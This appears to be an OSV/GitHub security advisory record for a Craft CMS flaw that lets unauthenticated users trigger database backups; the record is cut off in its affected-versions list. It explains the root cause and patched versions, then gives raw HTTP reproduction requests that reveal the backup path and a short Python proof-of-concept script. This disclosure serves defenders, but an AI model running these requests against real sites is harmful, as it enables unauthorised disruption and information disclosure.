{"schema_version":"1.7.3","id":"GHSA-v64r-7wg9-23pr","published":"2026-01-05T18:49:56Z","modified":"2026-01-05T18:56:07.008805Z","summary":"Unauthenticated Craft CMS users can trigger a database backup","details":"Unauthenticated users can trigger database backup operations via specific admin actions, potentially leading to resource exhaustion or information disclosure.\n\nUsers should update to the patched versions (5.8.21 and 4.16.17) to mitigate the issue.\n\nCraft 3 users should update to the latest Craft 4 and 5 releases, which include the fixes.\n\nResources:\n\nhttps://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39\n\nhttps://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04\n\n## Affected Endpoints\n\n- `POST /admin/actions/app/migrate` (unauthenticated)\n- `POST /admin/actions/updater/backup` \n\n## Vulnerability Details\n\n### Root Cause\nCertain admin actions are explicitly configured with anonymous access:\n\n```php\n// AppController.php\nprotected array|bool|int $allowAnonymous = [\n    'migrate' => self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE,\n    // ...\n];\n\n// BaseUpdaterController.php  \nprotected array|bool|int $allowAnonymous = self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE;\n```\n\n### Attack Vector\n1. Send unauthenticated POST request to `/admin/actions/app/migrate`\n2. If `backupOnUpdate` is enabled, triggers `Craft::$app->getDb()->backup()`\n3. Database backup executes with configured `backupCommand`\n\n\n## Reproduction Steps\n\n### Prerequisites\n- CraftCMS 5.8.19 installation\n- Database backups enabled (`backupOnUpdate => true` in config)\n- Target accessible via HTTP\n\n### Step-by-Step Reproduction\n\n1. I sent a `GET` request to:\n\nhttps://host/admin/login\n\n3. I copied the `CRAFT_CSRF_TOKEN` from the `Set-Cookie` header as well as the `csrfTokenValue` included in the response body.\n\n4. I used those values in the following request to trigger the updater initialization:\n\n```http\n   POST /admin/actions/updater/index HTTP/1.1\n   Host: host\n   Cookie: CRAFT_CSRF_TOKEN=xxxxxx\n   Content-Type: application/x-www-form-urlencoded\n\n   CRAFT_CSRF_TOKEN=xxxxxxxxx\n```\n\n5. After this, I examined the response and found the dynamically generated sign key embedded inside:\n\n```json\n   Craft.Updater(\"updater\").setState({\n       \"status\": \"Nothing to update.\",\n       \"finished\": true,\n       \"returnUrl\": \"dashboard\",\n       \"data\": \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx{\\\"migrate\\\":[]}\"\n   })\n```\n\n7. I then used that extracted `data` value to perform a database backup by issuing:\n\n```\n   POST /admin/actions/updater/backup HTTP/1.1\n   Host: host\n   Cookie: CRAFT_CSRF_TOKEN=xxxx\n   Content-Type: application/x-www-form-urlencoded\n\n   CRAFT_CSRF_TOKEN=xxxxxx&data=xxxxxxxxxxxxxxxxxxxxxxxxxx%7B%22migrate%22%3A%5B%5D%7D\n```\n\n9. The server responded successfully, initiating a database backup and returning the backup path:\n\n```\n   {\n       \"nextAction\": \"migrate\",\n       \"status\": \"Updating database…\",\n       \"data\": \"582c1863...{\\\"migrate\\\":[],\\\"dbBackupPath\\\":\\\"/home/xxxxx/host/craft-cms/storage/backups/sendbird--2025-11-14-142917--v4.15.0.2.sql\\\"}\"\n   }\n```\n\n### Expected Results\n- **Success**: Database backup initiated (check server logs for backup activity)\n- **Resource Impact**: High CPU/disk usage during backup\n- **Potential RCE**: If `backupCommand` is configured with shell commands\n\n## Proof of Concept Code\n\n```python\nimport requests\nimport re\n\nTARGET = \"http://192.168.100.46:8080\"\nsession = requests.Session()\n\n# Get CSRF token\nr = session.get(f\"{TARGET}/admin/login\")\ncsrf = re.search(r'name=\"CRAFT_CSRF_TOKEN\" value=\"([^\"]+)\"', r.text).group(1)\n\n# Trigger backup\nr = session.post(f\"{TARGET}/admin/actions/app/migrate\", \n                data={\"applyProjectConfigChanges\": \"false\"})\nprint(f\"Backup triggered: {r.content}\")\n```","affected":[{"package":{"name":"craftcms/cms","ecosystem":"Packagist","purl":"pkg:composer/craftcms/cms"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"5.0.0-RC1"},{"fixed":"5.8.21"}]}],"versions":["5.0.0","5.0.0-RC1","5.0.1","5.0.2","5.0.3","5.0.4","5.0.5","5.0.6","5.1.0","5.1.1","5.1.10","5.1.2","5.1.3","5.1.4","5.1.5","5.1.6","5.1.7","5.1.8","5.1.9","5.2.0","5.2.0-beta.1","5.2.0-beta.2","5.2.0-beta.3","5.2.0-beta.4","5.2.0-beta.5","5.2.0-beta.6","5.2.1","5.2.10","5.2.2","5.2.3","5.2.4","5.2.4.1","5.2.5","5.2.6","5.2.7","5.2.8","5.2.9","5.3.0","5.3.0-beta.1","5.3.0-beta.2","5.3.0.1","5.3.0.2","5.3.0.3","5.3.1","5.3.2","5.3.3","5.3.4","5.3.5","5.3.6","5.4.0","5.4.0.1","5.4.1","5.4.10","5.4.10.1","5.4.2","5.4.3","5.4.4","5.4.5","5.4.5.1","5.4.6","5.4.7","5.4.7.1","5.4.8","5.4.9","5.5.0","5.5.0.1","5.5.1","5.5.1.1","5.5.10","5.5.2","5.5.3","5.5.4","5.5.5","5.5.6","5.5.6.1","5.5.7","5.5.8","5.5.9","5.6.0","5.6.0.1","5.6.0.2","5.6.1","5.6.10","5.6.10.1","5.6.10.2","5.6.11","5.6.12","5.6.13","5.6.14","5.6.15","5.6.16","5.6.17","5.6.2","5.6.3","5.6.4","5.6.5","5.6.5.1","5.6.6","5.6.7","5.6.8","5.6.9","5.6.9.1","5.7.0","5.7.0-beta.1","5.7.0-beta.2","5.7.1","5.7.1.1","5.7.10","5.7.11","5.7.2","5.7.3","5.7.4","5.7.5","5.7.6","5.7.7","5.7.8","5.7.8.1","5.7.8.2","5.7.9","5.8.0","5.8.1","5.8.10","5.8.11","5.8.12","5.8.13","5.8.13.1","5.8.13.2","5.8.14","5.8.15","5.8.16","5.8.17","5.8.18","5.8.19","5.8.2","5.8.20","5.8.3","5.8.4","5.8.5","5.8.6","5.8.7","5.8.8","5.8.9"],"database_specific":{"last_known_affected_version_range":"<=
